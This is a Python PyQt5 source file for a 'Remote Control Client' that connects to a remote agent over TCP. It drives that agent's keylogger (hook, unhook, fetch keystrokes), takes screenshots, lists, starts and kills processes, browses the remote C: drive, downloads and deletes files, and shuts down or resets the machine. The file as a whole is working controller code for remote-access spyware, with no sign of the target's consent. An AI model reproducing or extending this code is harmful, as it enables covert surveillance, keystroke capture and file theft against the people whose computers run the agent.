import sys
import json
import socket
import os
from typing import Optional, Union
import time
from datetime import datetime
import logging

from PyQt5.QtWidgets import (
    QApplication, QDialog, QMainWindow, QMessageBox, QFileDialog, 
    QGraphicsScene, QTableWidgetItem, QWidget
)
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QPixmap, QPainter
from PyQt5 import QtGui

# Import all UI files
from dialog_ui import *

class NetworkManager:
    def __init__(self):
        self.main_socket: Optional[socket.socket] = None  # For process/app (new version)
        self.basic_socket: Optional[socket.socket] = None  # For keylogger/files (old version)
        self.connected = False
        self.timeout = 300
        self.buffer_size = 4096

    def connect(self, host: str, port: int) -> bool:
        """Establish both connections"""
        try:
            if self.main_socket:
                self.main_socket.close()
            if self.basic_socket:
                self.basic_socket.close()
                
            # First connect main socket
            self.main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.main_socket.settimeout(self.timeout)
            self.main_socket.connect((host, port))
            
            # Then connect basic socket
            self.basic_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.basic_socket.settimeout(self.timeout)
            self.basic_socket.connect((host, port + 1))
            
            self.connected = True
            return True
        except Exception as e:
            self.connected = False
            self.cleanup()
            raise ConnectionError(f"Connection failed: {str(e)}")

    def send_message(self, msg: str) -> str:
        """Send message using appropriate socket based on command type"""
        if not self.connected:
            raise ConnectionError("Not connected to server")
            
        try:
            # Special handling for capture command (screenshot)
            if msg == 'capture':
                self.basic_socket.settimeout(self.timeout)
                self.basic_socket.sendall(b'capture')
                return 'ok'
            
            # Use main socket for process and app commands
            if msg.startswith(('process//', 'app//')):
                return self._send_main_message(msg)
            # Use basic socket for everything else
            else:
                return self._send_basic_message(msg)
                
        except Exception as e:
            # Don't set connected to False here
            # Just raise the error and let the calling method handle it
            raise ConnectionError(f"Communication error: {str(e)}")

    def _handle_capture(self) -> str:
        """Handle screenshot capture - returns 'ok' on success"""
        if not self.basic_socket:
            raise ConnectionError("Basic socket not connected")
            
        try:
            self.basic_socket.settimeout(self.timeout)
            self.basic_socket.sendall(b'capture')  # Send as bytes
            
            # First receive the status response
            response = self.basic_socket.recv(1024).decode('utf-8')
            if response != 'ready':
                return 'error'
                
            return 'ok'  # Signal success to the capture dialog
            
        except Exception as e:
            raise ConnectionError(f"Screenshot error: {str(e)}")

    def _send_main_message(self, msg: str) -> str:
        """Send message using main socket with new format"""
        if not self.main_socket:
            raise ConnectionError("Main socket not connected")
            
        try:
            self.main_socket.settimeout(self.timeout)
            self.main_socket.sendall(msg.encode("utf-8"))
            return self._receive_main_response()
        except Exception as e:
            raise ConnectionError(f"Main socket error: {str(e)}")

    def _send_basic_message(self, msg: str) -> str:
        """Send message using basic socket with old format"""
        if not self.basic_socket:
            raise ConnectionError("Basic socket not connected")
            
        try:
            self.basic_socket.settimeout(self.timeout)
            self.basic_socket.sendall(msg.encode("utf-8"))
            
            data = ""
            start_time = time.time()
            
            while True:
                try:
                    chunk = self.basic_socket.recv(self.buffer_size)
                    if not chunk:
                        break
                    data += chunk.decode("utf-8")
                    if len(chunk) < self.buffer_size:
                        break
                    # Check timeout
                    if time.time() - start_time > self.timeout:
                        raise socket.timeout("Operation timed out")
                except socket.timeout:
                    if data:  # If we have some data, consider it complete
                        break
                    raise  # Re-raise the timeout if no data received
                    
            return data
            
        except Exception as e:
            raise ConnectionError(f"Basic socket error: {str(e)}")

    def _receive_main_response(self) -> str:
        """Receive formatted response from main socket"""
        data = ""
        while True:
            chunk = self.main_socket.recv(self.buffer_size).decode("utf-8")
            if not chunk:
                break
            data += chunk
            if '\n' in chunk:  # New format uses newline as message terminator
                break
        return data.strip()

    def parse_server_response(self, response: str) -> tuple[bool, any]:
        """Parse standardized server response for process/app commands"""
        try:
            resp_data = json.loads(response)
            if not isinstance(resp_data, dict) or 'status' not in resp_data or 'data' not in resp_data:
                return False, "Invalid server response format"
            return resp_data['status'] == 'success', resp_data['data']
        except json.JSONDecodeError as e:
            return False, f"Failed to parse server response: {e.msg}"
        except Exception as e:
            return False, f"Error processing response: {str(e)}"

    def receive_file(self, filename: str) -> bool:
        """Receive file using basic socket"""
        try:
            with open(filename, 'wb') as f:
                while True:
                    chunk = self.basic_socket.recv(1024)
                    if chunk.endswith(b'<<END>>'):
                        f.write(chunk[:-7])
                        break
                    if not chunk:
                        break
                    f.write(chunk)
            return True
        except Exception as e:
            if os.path.exists(filename):
                os.remove(filename)  # Clean up incomplete file
            raise ConnectionError(f"File reception error: {str(e)}")

    def send_file_command(self, msg: str) -> bool:
        """Send file-related command using basic socket"""
        if not self.connected or not self.basic_socket:
            raise ConnectionError("Not connected to server")
            
        try:
            self.basic_socket.sendall(msg.encode("utf-8"))
            with open("temp_file", 'wb') as f:
                while True:
                    chunk = self.basic_socket.recv(8192)
                    if chunk.endswith(b'<<END>>'):
                        f.write(chunk[:-7])
                        break
                    if not chunk:
                        break
                    f.write(chunk)
            return True
        except Exception as e:
            raise ConnectionError(f"File command error: {str(e)}")

    def receive_screenshot(self, filename: str) -> bool:
        """Receive screenshot using basic socket"""
        try:
            with open(filename, 'wb') as f:
                while True:
                    chunk = self.basic_socket.recv(8192)
                    if not chunk:
                        break
                    if chunk == b'ok':
                        break
                    f.write(chunk)
            return True
        except Exception as e:
            raise ConnectionError(f"Screenshot reception error: {str(e)}")

    def cleanup(self):
        """Clean up both sockets"""
        if self.main_socket:
            try:
                self.main_socket.close()
            except:
                pass
            self.main_socket = None
            
        if self.basic_socket:
            try:
                self.basic_socket.close()
            except:
                pass
            self.basic_socket = None
            
        self.connected = False

    def disconnect(self):
        """Disconnect from both sockets"""
        if self.connected:
            try:
                if self.main_socket:
                    self.main_socket.sendall(b'quit')
                if self.basic_socket:
                    self.basic_socket.sendall(b'quit')
            except:
                pass
            finally:
                self.cleanup()

    def check_basic_connection(self) -> bool:
        """Check if basic socket is still connected"""
        try:
            if not self.basic_socket:
                return False
                
            # Try to send a test message
            self.basic_socket.settimeout(1)  # Short timeout for test
            self.basic_socket.sendall(b'ping')
            response = self.basic_socket.recv(4)
            return response == b'pong'
        except:
            return False
        finally:
            if self.basic_socket:
                self.basic_socket.settimeout(self.timeout)

class Window(QDialog, Ui_dialog_main):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.network = NetworkManager()
        self.setup_ui()
        self.setup_connections()
        
        # Removed the timer as it might interfere with connections

    def setup_ui(self):
        self.lineEdit.setText('192.168.1.6:8080')
        self.disable_control_buttons()
        self.setWindowTitle("Remote Control Client")

    def setup_connections(self):
        self.btn_cap.clicked.connect(self.capture)
        self.btn_process.clicked.connect(self.process)
        self.btn_app.clicked.connect(self.app)
        self.btn_key.clicked.connect(self.key)
        self.btn_connect.clicked.connect(self.connect)
        self.btn_shutdown.clicked.connect(self.shutdown)
        self.btn_reset.clicked.connect(self.reset)
        self.btn_files.clicked.connect(self.show_files)
        self.btn_exit.clicked.connect(self.exit)

    def check_connection(self) -> bool:
        try:
            if not self.network.connected:
                return False
            # Just check if socket is still connected
            return True
        except:
            return False

    def connect(self):
        try:
            host, port = self.lineEdit.text().split(':')
            if self.network.connect(host, int(port)):
                self.label.setText(f'Connected to: {host}:{port}')
                self.enable_control_buttons()
                QMessageBox.information(self, "Success", "Connection successful")
        except Exception as e:
            self.show_error(f"Connection failed: {str(e)}")
            self.disable_control_buttons()

    def capture(self):
        if not self.check_connection():
            self.show_error("Not connected to server")
            return
        try:
            dialog = Dialog_capture(self.network, self)
            dialog.exec()
        except Exception as e:
            self.show_error(f"Operation failed: {str(e)}")

    def show_files(self):
        if not self.check_connection():
            self.show_error("Not connected to server")
            return
        try:
            dialog = Dialog_files(self.network, self)
            dialog.exec()
        except Exception as e:
            self.show_error(f"Operation failed: {str(e)}")
    
    def process(self):
        if not self.check_connection():
            self.show_error("Not connected to server")
            return
        try:
            dialog = Dialog_process(self.network, self)
            dialog.exec()
        except Exception as e:
            self.show_error(f"Operation failed: {str(e)}")

    def app(self):
        if not self.check_connection():
            self.show_error("Not connected to server")
            return
        try:
            dialog = Dialog_app(self.network, self)
            dialog.exec()
        except Exception as e:
            self.show_error(f"Operation failed: {str(e)}")

    def key(self):
        if not self.check_connection():
            self.show_error("Not connected to server")
            return
        try:
            dialog = Dialog_keystroke(self.network, self)
            dialog.exec()
        except Exception as e:
            self.show_error(f"Operation failed: {str(e)}")

    def shutdown(self):
        if not self.check_connection():
            self.show_error("Not connected to server")
            return
            
        if QMessageBox.question(self, 'Confirm Shutdown', 
            'Are you sure you want to shutdown the remote computer?',
            QMessageBox.Yes | QMessageBox.No) == QMessageBox.Yes:
            try:
                self.network.send_message('shutdown')
            except Exception as e:
                self.show_error(f"Shutdown failed: {str(e)}")

    def reset(self):
        if not self.check_connection():
            self.show_error("Not connected to server")
            return
            
        if QMessageBox.question(self, 'Confirm Reset', 
            'Are you sure you want to reset the remote computer?',
            QMessageBox.Yes | QMessageBox.No) == QMessageBox.Yes:
            try:
                self.network.send_message('reset')
            except Exception as e:
                self.show_error(f"Reset failed: {str(e)}")

    def exit(self):
        try:
            self.network.disconnect()
        except:
            pass
        self.close()

    def enable_control_buttons(self):
        for btn in [self.btn_cap, self.btn_app, self.btn_key, 
                   self.btn_process, self.btn_shutdown, self.btn_reset, self.btn_files]:
            btn.setEnabled(True)

    def disable_control_buttons(self):
        for btn in [self.btn_cap, self.btn_app, self.btn_key, 
                   self.btn_process, self.btn_shutdown, self.btn_reset, self.btn_files]:
            btn.setEnabled(False)

    def show_error(self, message: str):
        QMessageBox.critical(self, "Error", message)

    def closeEvent(self, event):
        try:
            self.network.disconnect()
        except:
            pass
        event.accept()

# Dialog classes
class Dialog_process(QDialog, Ui_dialog_process):
    def __init__(self, network: NetworkManager, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.network = network
        self.setup_ui()
        self.connect_signals()

    def setup_ui(self):
        self.tableWidget.setColumnCount(3)
        self.tableWidget.setHorizontalHeaderLabels(['Name', 'Process ID', 'Thread Count'])
        self.tableWidget.horizontalHeader().setStretchLastSection(True)
        self.tableWidget.setAlternatingRowColors(True)

    def connect_signals(self):
        self.btn_show.clicked.connect(self.view_processes) 
        self.btn_delete.clicked.connect(self.clear_table)  
        self.btn_kill.clicked.connect(self.kill_process)
        self.btn_start.clicked.connect(self.start_process)

    def view_processes(self):
        try:
            QtWidgets.QApplication.setOverrideCursor(Qt.WaitCursor)
            response = self.network.send_message('process//list')
            success, data = self.network.parse_server_response(response)
            
            if not success:
                QMessageBox.critical(self, "Error", str(data))
                return
                
            if not isinstance(data, dict) or 'process' not in data:
                QMessageBox.critical(self, "Error", "Invalid process data format")
                return

            processes = data['process']
            self.tableWidget.setRowCount(0)
            self.tableWidget.setRowCount(len(processes))
            
            for row, process in enumerate(processes):
                try:
                    name = str(process.get('name', '')).strip()
                    pid = str(process.get('PID', '')).strip()
                    threads = str(process.get('TC', '')).strip()
                    
                    self.tableWidget.setItem(row, 0, QTableWidgetItem(name))
                    self.tableWidget.setItem(row, 1, QTableWidgetItem(pid))
                    self.tableWidget.setItem(row, 2, QTableWidgetItem(threads))
                except Exception as e:
                    logging.error(f"Error adding row {row}: {str(e)}")
                    continue

            self.tableWidget.resizeColumnsToContents()
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to retrieve process list: {str(e)}")
        finally:
            QtWidgets.QApplication.restoreOverrideCursor()

    def clear_table(self):
        self.tableWidget.setRowCount(0)

    def kill_process(self):
        dialog = Dialog_kill('process', self.network, self)
        dialog.exec_()

    def start_process(self):
        dialog = Dialog_start('process', self.network, self)
        dialog.exec_()

class Dialog_app(QDialog, Ui_dialog_app):
    def __init__(self, network: NetworkManager, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.network = network
        self.setup_ui()
        self.connect_signals()

    def setup_ui(self):
        self.tableWidget.setColumnCount(3)
        self.tableWidget.setHorizontalHeaderLabels(['Application', 'ID', 'Thread Count'])
        self.tableWidget.horizontalHeader().setStretchLastSection(True)
        self.tableWidget.setAlternatingRowColors(True)

    def connect_signals(self):
        self.btn_show.clicked.connect(self.view_apps)
        self.btn_delete.clicked.connect(self.clear_table)
        self.btn_kill.clicked.connect(self.kill_app)
        self.btn_start.clicked.connect(self.start_app)

    def view_apps(self):
        try:
            QtWidgets.QApplication.setOverrideCursor(Qt.WaitCursor)
            
            # Set a timer to prevent UI from being stuck too long
            timer = QTimer()
            timer.singleShot(10000, lambda: QtWidgets.QApplication.restoreOverrideCursor())  # 10 second timeout
            
            response = self.network.send_message('app//list')
            success, data = self.network.parse_server_response(response)
            
            if timer.isActive():
                timer.stop()
                QtWidgets.QApplication.restoreOverrideCursor()
            
            if not success:
                QMessageBox.critical(self, "Error", str(data))
                return
            
            if not isinstance(data, dict) or 'app' not in data:
                QMessageBox.critical(self, "Error", "Invalid application data format")
                return

            apps = data['app']
            if not isinstance(apps, list):
                QMessageBox.critical(self, "Error", "Server returned invalid application list format")
                return

            self.tableWidget.setRowCount(0)
            self.tableWidget.setRowCount(len(apps))
            
            for row, app in enumerate(apps):
                try:
                    name = str(app.get('name', 'Unknown')).strip()
                    pid = str(app.get('ID', 'N/A')).strip()
                    threads = str(app.get('TC', 'N/A')).strip()
                    
                    self.tableWidget.setItem(row, 0, QTableWidgetItem(name))
                    self.tableWidget.setItem(row, 1, QTableWidgetItem(pid))
                    self.tableWidget.setItem(row, 2, QTableWidgetItem(threads))
                except Exception as e:
                    logging.error(f"Error adding row {row}: {str(e)}")
                    continue

            self.tableWidget.resizeColumnsToContents()
            self.tableWidget.resizeRowsToContents()
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to retrieve application list: {str(e)}")
        finally:
            QtWidgets.QApplication.restoreOverrideCursor()

    def clear_table(self):
        self.tableWidget.setRowCount(0)

    def kill_app(self):
        dialog = Dialog_kill('app', self.network, self)
        # Set a timer to auto-close if operation takes too long
        QTimer.singleShot(5000, dialog.close)  # 5 second timeout
        dialog.exec_()

    def start_app(self):
        dialog = Dialog_start('app', self.network, self)
        dialog.exec_()

class Dialog_kill(QDialog, Ui_dialog_kill):
    def __init__(self, status: str, network: NetworkManager, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.status = status
        self.network = network
        self.btn_kill.clicked.connect(self.kill)

    def kill(self):
        try:
            pid = self.lineEdit.text().strip()
            if not pid:
                QMessageBox.warning(self, "Warning", "Please enter a valid Process ID")
                return
                
            if not pid.isdigit():
                QMessageBox.warning(self, "Warning", "Process ID must be a number")
                return

            QtWidgets.QApplication.setOverrideCursor(Qt.WaitCursor)
            response = self.network.send_message(f'{self.status}//kill//{pid}')
            success, data = self.network.parse_server_response(response)
            
            if success:
                QMessageBox.information(self, "Success", str(data))
                self.accept()
                # Refresh the parent dialog
                parent = self.parent()
                if isinstance(parent, (Dialog_process, Dialog_app)):
                    QtWidgets.QApplication.processEvents()
                    if isinstance(parent, Dialog_app):
                        parent.view_apps()
                    else:
                        parent.view_processes()
            else:
                QMessageBox.warning(self, "Warning", str(data))
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Operation failed: {str(e)}")
        finally:
            QtWidgets.QApplication.restoreOverrideCursor()

class Dialog_start(QDialog, Ui_dialog_start):
    def __init__(self, status: str, network: NetworkManager, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.status = status
        self.network = network
        self.btn_start.clicked.connect(self.start)

    def start(self):
        try:
            if not self.lineEdit.text().strip():
                QMessageBox.warning(self, "Warning", "Please enter a valid process name")
                return

            response = self.network.send_message(
                f'{self.status}//start//{self.lineEdit.text().strip()}'
            )

            success, data = self.network.parse_server_response(response)
            
            if success:
                QMessageBox.information(self, "Success", str(data))
                self.accept()
                # Refresh the parent dialog
                parent = self.parent()
                if isinstance(parent, (Dialog_process, Dialog_app)):
                    QtWidgets.QApplication.processEvents()
                    if isinstance(parent, Dialog_app):
                        parent.view_apps()
                    else:
                        parent.view_processes()
            else:
                QMessageBox.warning(self, "Warning", str(data))
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Operation failed: {str(e)}")

class Dialog_keystroke(QDialog, Ui_dialog_keystroke):
    def __init__(self, network: NetworkManager, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.network = network
        self.setup_ui()
        self.connect_signals()

    def setup_ui(self):
        self.textBrowser_2.setReadOnly(True)
        self.is_hooked = False
        self.update_hook_button_state()

    def connect_signals(self):
        self.btn_hook.clicked.connect(self.toggle_hook)
        self.btn_unhook.clicked.connect(self.unhook)
        self.btn_key.clicked.connect(self.get_keystrokes)
        self.btn_delete.clicked.connect(self.clear_log)

    def toggle_hook(self):
        try:
            response = self.network.send_message('key//hook')
            if response == 'ok':
                self.is_hooked = True
                self.update_hook_button_state()
                QMessageBox.information(self, "Success", "Keylogger started")
            else:
                raise Exception("Failed to start keylogger")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start keylogger: {str(e)}")

    def unhook(self):
        try:
            response = self.network.send_message('key//unhook')
            if response == 'ok':
                self.is_hooked = False
                self.update_hook_button_state()
                QMessageBox.information(self, "Success", "Keylogger stopped")
            else:
                raise Exception("Failed to stop keylogger")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to stop keylogger: {str(e)}")

    def get_keystrokes(self):
        try:
            response = self.network.send_message('key//getkey')
            if response and response != '404':
                current_text = self.textBrowser_2.toPlainText()
                self.textBrowser_2.setText(current_text + response)
                self.textBrowser_2.verticalScrollBar().setValue(
                    self.textBrowser_2.verticalScrollBar().maximum()
                )
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to retrieve keystrokes: {str(e)}")

    def clear_log(self):
        self.textBrowser_2.clear()

    def update_hook_button_state(self):
        self.btn_hook.setEnabled(not self.is_hooked)
        self.btn_unhook.setEnabled(self.is_hooked)

class Dialog_capture(QDialog, Ui_dialog_capture):
    def __init__(self, network: NetworkManager, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.network = network
        self.pushButton_2.clicked.connect(self.capture)  
        self.pushButton_3.clicked.connect(self.save)     

    def capture(self):
        try:
            # Show wait cursor
            QtWidgets.QApplication.setOverrideCursor(Qt.WaitCursor)
            
            # Check if basic socket is available
            if not self.network.basic_socket:
                raise Exception("Not connected to server")

            # Send capture command
            self.network.basic_socket.settimeout(self.network.timeout)
            self.network.basic_socket.sendall(b'capture')

            # Create buffer for faster processing
            img_data = bytearray()
            
            # Receive with larger buffer for better performance
            while True:
                try:
                    chunk = self.network.basic_socket.recv(32768)
                    if not chunk:
                        break
                    if chunk.endswith(b'<<END>>'):
                        img_data.extend(chunk[:-7])
                        break
                    img_data.extend(chunk)
                    
                except socket.timeout:
                    if len(img_data) > 0:
                        break
                    raise TimeoutError("Screenshot capture timed out")

            if not img_data:
                raise Exception("No data received")

            # Display directly from memory
            pixmap = QPixmap()
            if pixmap.loadFromData(img_data):
                scene = QtWidgets.QGraphicsScene(self)
                scene.addPixmap(pixmap)
                self.graphicsView.setScene(scene)
                self.graphicsView.fitInView(scene.sceneRect(), QtCore.Qt.KeepAspectRatio)
                
                # Save to file
                with open('capture.png', 'wb') as f:
                    f.write(img_data)
            else:
                raise Exception("Failed to load image data")
                
        except TimeoutError as e:
            QMessageBox.warning(self, "Warning", 
                "Connection timed out but the screenshot might have been saved.\n"
                "Try using the Save button.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Screenshot failed: {str(e)}")
        finally:
            QtWidgets.QApplication.restoreOverrideCursor()

    def save(self):
        path = QFileDialog.getSaveFileName(self, 'Save File', 'capture.png')
        if path[0]:
            try:
                file1 = open("capture.png", "rb")
                file2 = open(str(path[0]), "wb")
                l = file1.readline()
                while l:
                    file2.write(l)
                    l = file1.read()
                file1.close()
                file2.close()
                QMessageBox.information(self, "Success", "Screenshot saved successfully")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save screenshot: {str(e)}")

class Dialog_files(QDialog, Ui_dialog_files):
    def __init__(self, network: NetworkManager, parent=None):
        super().__init__(parent)
        self.setupUi(self)
        self.network = network
        self.current_path = "C:\\"  # Default path
        self.path_history = ["C:\\"]  # Add path history
        self.setup_shortcuts()
        self.setup_connections()
        self.pathEdit.setText(self.current_path)
        self.refresh_files()

    def setup_connections(self):
        self.btn_browse.clicked.connect(self.browse_typed_path)
        self.btn_refresh.clicked.connect(self.refresh_files)
        self.btn_download.clicked.connect(self.download_file)
        self.btn_delete.clicked.connect(self.delete_file)
        self.pathEdit.returnPressed.connect(self.browse_typed_path)
        self.treeWidget.itemDoubleClicked.connect(self.on_item_double_clicked)

    def setup_shortcuts(self):
        self.shortcut_back = QtWidgets.QShortcut(QtGui.QKeySequence("Backspace"), self) # press backspace to return to previous directory
        self.shortcut_back.activated.connect(self.go_up_directory)

    def refresh_files(self):
        try:
            QtWidgets.QApplication.setOverrideCursor(Qt.WaitCursor)
            
            # Update window title to show current path
            self.setWindowTitle(f"File Manager - {self.current_path}")
            
            response = self.network.send_message(f'files//list//{self.current_path}')
            
            try:
                # Check if response is empty or invalid
                if not response or not response.strip():
                    raise Exception("Empty response from server")
                    
                data = json.loads(response)
                
                if data.get('status') == 'error':
                    # If the path doesn't exist, try going up one level
                    if 'Path does not exist' in data.get('error', ''):
                        parent_path = os.path.dirname(os.path.dirname(self.current_path.rstrip('\\'))) + '\\'
                        if parent_path and parent_path != self.current_path:
                            self.current_path = parent_path
                            self.pathEdit.setText(self.current_path)
                            return self.refresh_files()
                    raise Exception(data.get('error', 'Unknown error'))

                if 'items' not in data:
                    raise Exception("Invalid response format: missing items")

                self.update_file_list(data.get('items', []))
                
            except json.JSONDecodeError as e:
                # Log the problematic response for debugging
                logging.error(f"Invalid JSON response: {response[:1000]}...")  # Log first 1000 chars
                raise Exception(f"Invalid server response format: {str(e)}")
                    
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to list files: {str(e)}")
        finally:
            QtWidgets.QApplication.restoreOverrideCursor()
    
    def update_file_list(self, items):
        """Update the file list with received data"""
        self.treeWidget.clear()
        
        # Add parent directory entry if not at root
        if self.current_path.upper() != "C:\\":
            parent_item = QtWidgets.QTreeWidgetItem(["..", "", "Directory", ""])
            parent_item.setIcon(0, self.get_icon("Directory"))
            self.treeWidget.addTopLevelItem(parent_item)
            
        # Add received items
        for item in items:
            try:
                tree_item = QtWidgets.QTreeWidgetItem([
                    item['name'],
                    item.get('size', ''),
                    item.get('type', ''),
                    item.get('modified', '')
                ])
                tree_item.setIcon(0, self.get_icon(item.get('type', '')))
                self.treeWidget.addTopLevelItem(tree_item)
            except Exception as e:
                logging.error(f"Error creating tree item: {str(e)}")
                continue
                
        for i in range(self.treeWidget.columnCount()):
            self.treeWidget.resizeColumnToContents(i)

    def on_item_double_clicked(self, item, column):
        if item.text(2) == 'Directory':
            try:
                old_path = self.current_path
                
                if item.text(0) == "..":
                    # Go up one directory
                    new_path = os.path.dirname(os.path.dirname(self.current_path.rstrip('\\'))) + os.path.sep
                else:
                    # Enter selected directory
                    new_path = os.path.join(self.current_path, item.text(0))
                    
                # Normalize path and ensure it ends with separator
                new_path = os.path.normpath(new_path) + os.path.sep
                
                # Try to list files in new path before updating UI
                response = self.network.send_message(f'files//list//{new_path}')
                data = json.loads(response)
                
                if data.get('status') == 'error':
                    QMessageBox.warning(self, "Warning", data.get('error', 'Failed to access directory'))
                    return
                    
                # Only update path if listing was successful
                self.current_path = new_path
                self.pathEdit.setText(new_path)
                self.path_history.append(new_path)
                
                # Update the display with the received data
                self.update_file_list(data.get('items', []))
                
            except json.JSONDecodeError as e:
                QMessageBox.critical(self, "Error", f"Failed to parse server response: {str(e)}")
                # Revert path on error
                self.current_path = old_path
                self.pathEdit.setText(old_path)
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to change directory: {str(e)}")
                # Revert path on error
                self.current_path = old_path
                self.pathEdit.setText(old_path)

    def browse_typed_path(self):
        try:
            old_path = self.current_path
            new_path = self.pathEdit.text().strip()
            
            if not new_path:
                QMessageBox.warning(self, "Warning", "Please enter a path")
                self.pathEdit.setText(old_path)
                return
                
            # Normalize path
            new_path = os.path.normpath(new_path)
            if not new_path.endswith(os.path.sep):
                new_path += os.path.sep
                
            # Try to list files in new path before updating UI
            response = self.network.send_message(f'files//list//{new_path}')
            data = json.loads(response)
            
            if data.get('status') == 'error':
                QMessageBox.warning(self, "Warning", data.get('error', 'Failed to access directory'))
                self.pathEdit.setText(old_path)
                return
                
            # Only update if listing was successful
            self.current_path = new_path
            self.pathEdit.setText(new_path)
            self.path_history.append(new_path)
            
            # Update the display with the received data
            self.update_file_list(data.get('items', []))
            
        except json.JSONDecodeError as e:
            QMessageBox.critical(self, "Error", f"Failed to parse server response: {str(e)}")
            self.pathEdit.setText(old_path)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to browse path: {str(e)}")
            self.pathEdit.setText(old_path)

    def go_up_directory(self):
        try:
            if self.current_path.upper() == "C:\\":
                return
                
            old_path = self.current_path
            parent_path = os.path.dirname(os.path.dirname(self.current_path.rstrip('\\'))) + os.path.sep
            
            if not parent_path:
                return
                
            # Try to list files in parent path before updating UI
            response = self.network.send_message(f'files//list//{parent_path}')
            data = json.loads(response)
            
            if data.get('status') == 'error':
                QMessageBox.warning(self, "Warning", data.get('error', 'Failed to access directory'))
                return
                
            # Only update if listing was successful
            self.current_path = parent_path
            self.pathEdit.setText(parent_path)
            self.path_history.append(parent_path)
            
            # Update the display with the received data
            self.update_file_list(data.get('items', []))
            
        except json.JSONDecodeError as e:
            QMessageBox.critical(self, "Error", f"Failed to parse server response: {str(e)}")
            self.pathEdit.setText(old_path)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to go up directory: {str(e)}")
            self.pathEdit.setText(old_path)

    def download_file(self):
        try:
            current_item = self.treeWidget.currentItem()
            if not current_item:
                QMessageBox.warning(self, "Warning", "Please select a file to copy")
                return

            file_name = current_item.text(0)
            file_type = current_item.text(2)
            
            if file_type == 'Directory':
                QMessageBox.warning(self, "Warning", "Cannot copy directories")
                return

            full_path = os.path.join(self.current_path, file_name)
            save_path, _ = QFileDialog.getSaveFileName(
                self, "Save File", file_name, "All Files (*.*)"
            )
            
            if save_path:
                QtWidgets.QApplication.setOverrideCursor(Qt.WaitCursor)
                try:
                    if self.network.send_file_command(f'files//download//{full_path}'):
                        # Use shutil.copy2 instead of os.rename
                        import shutil
                        if os.path.exists("temp_file"):
                            if os.path.exists(save_path):
                                os.remove(save_path)
                            shutil.copy2("temp_file", save_path)
                            os.remove("temp_file")  # Clean up temp file after copying
                            QMessageBox.information(self, "Success", "File copied successfully")
                        else:
                            raise Exception("Failed to receive file")
                finally:
                    QtWidgets.QApplication.restoreOverrideCursor()
                    # Ensure temp file is cleaned up
                    if os.path.exists("temp_file"):
                        try:
                            os.remove("temp_file")
                        except:
                            pass
                        
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to copy file: {str(e)}")

    def delete_file(self):
        try:
            current_item = self.treeWidget.currentItem()
            if not current_item:
                QMessageBox.warning(self, "Warning", "Please select a file or folder to delete")
                return

            file_name = current_item.text(0)
            if file_name == "..":
                return
                
            full_path = os.path.join(self.current_path, file_name)
            
            if QMessageBox.question(
                self, 'Confirm Delete', 
                f'Are you sure you want to delete "{file_name}"?',
                QMessageBox.Yes | QMessageBox.No
            ) == QMessageBox.Yes:
                try:
                    response = self.network.send_message(f'files//delete//{full_path}')
                    data = json.loads(response)
                    
                    if data.get('status') == 'success':
                        QMessageBox.information(self, "Success", data.get('message', 'File deleted successfully'))
                        self.refresh_files()
                    else:
                        raise Exception(data.get('error', 'Failed to delete file'))
                        
                except json.JSONDecodeError:
                    raise Exception("Invalid server response")
                        
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to delete file: {str(e)}")

    def get_icon(self, type_str):
        if type_str == 'Directory':
            return QtGui.QIcon(QtGui.QPixmap("folder.png"))
        return QtGui.QIcon(QtGui.QPixmap("file.png"))


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    win = Window()
    win.show()
    
    sys.exit(app.exec())